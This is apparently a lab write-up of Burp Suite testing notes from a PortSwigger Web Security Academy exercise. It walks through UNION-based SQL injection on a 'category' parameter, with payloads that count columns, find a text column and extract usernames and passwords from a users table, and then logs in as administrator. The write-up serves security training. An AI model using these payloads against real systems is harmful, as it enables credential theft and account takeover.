# Burp Suite Testing Notes

## Overview

Burp Suite Professional was used to intercept, modify, replay, and analyze HTTP requests during the SQL injection assessment.

The vulnerable `category` parameter was transferred to Burp Suite Repeater for controlled manual testing.

---

## Testing Workflow

```text
Browser
   ↓
Burp Suite Proxy
   ↓
Intercept HTTP Request
   ↓
Send to Repeater
   ↓
Modify category Parameter
   ↓
Send UNION Payloads
   ↓
Analyze HTTP Response
   ↓
Extract Database Information
```

---

## 1. Original Request

The original request contained the vulnerable parameter:

```http
GET /filter?category=Accessories HTTP/2
```

The request was captured through Burp Suite Proxy and sent to Repeater.

Evidence:

```text
../screenshots/02-original-request.png
```

---

## 2. Column Count Testing

The following payload was tested in the `category` parameter:

```sql
' UNION SELECT NULL,NULL--
```

The successful response established that the original query returned two columns.

Evidence:

```text
../screenshots/03-column-count.png
```

---

## 3. Text Column Testing

The first column was tested:

```sql
' UNION SELECT 'abc',NULL--
```

The application returned an error.

The second column was then tested:

```sql
' UNION SELECT NULL,'abc'--
```

The request was successful, identifying the second column as text-compatible.

Evidence:

```text
../screenshots/04-text-compatible-column.png
```

---

## 4. Credential Extraction

The following UNION query was used:

```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

The query retrieved the `username` and `password` fields from the `users` table and concatenated them into a single output value.

Evidence:

```text
../screenshots/05-credential-extraction.png
```

### Security Note

The credential extraction screenshot contains sensitive authentication information.

Before publishing this repository publicly:

* Redact password values.
* Do not commit real credentials.
* Keep only the technical evidence necessary to demonstrate the exploitation.

---

## 5. Authentication Verification

The extracted administrator credentials were used through the application's login functionality.

The application successfully authenticated the user as:

```text
administrator
```

The lab subsequently reported:

```text
LAB — Solved
```

Evidence:

```text
../screenshots/06-lab-solved.png
```

---

## Burp Suite Components Used

### Proxy

Used to intercept the original HTTP request from the browser.

### Repeater

Used to manually modify the `category` parameter and repeatedly test SQL injection payloads.

### HTTP Response Analysis

Used to identify:

* Successful UNION queries
* Text reflection
* Database output
* Extracted account information
* Successful authentication

---

## Testing Method

All testing was performed manually to understand the behavior of the vulnerable parameter and validate the SQL injection attack path.

The testing process followed:

1. Request interception.
2. Injection point identification.
3. Column count enumeration.
4. Text-compatible column identification.
5. UNION-based data extraction.
6. Credential identification.
7. Authentication verification.

---

## Authorization

Testing was performed exclusively against the intentionally vulnerable PortSwigger Web Security Academy laboratory environment.

No unauthorized systems were targeted.
